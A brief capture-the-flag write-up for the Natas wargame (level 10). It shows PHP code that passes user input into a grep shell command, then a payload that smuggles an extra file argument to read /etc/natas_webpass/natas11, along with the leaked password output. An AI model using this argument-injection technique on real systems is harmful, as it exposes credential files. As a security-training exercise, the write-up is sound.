# Solution
```
<pre>  
<?  
$key = "";  
  
if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];  
}  
  
if($key != "") {  
    if(preg_match('/[;|&]/',$key)) {  
        print "Input contains an illegal character!";  
    } else {        passthru("grep -i $key dictionary.txt");  
    }  
}  
?>
```

The grep -i command works as follow:
the part `$key dictionary.txt` means that it will try to find any word with value $key in text file. The funny thing about this grep is we can specify multiple text files.

If our payload is:
```
a /etc/natas_webpass/natas11
```

it is an equivalent of:
```
grep -i natas /etc/natas_webpass/natas11 dictionar.txt
```

```
Output:

/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
```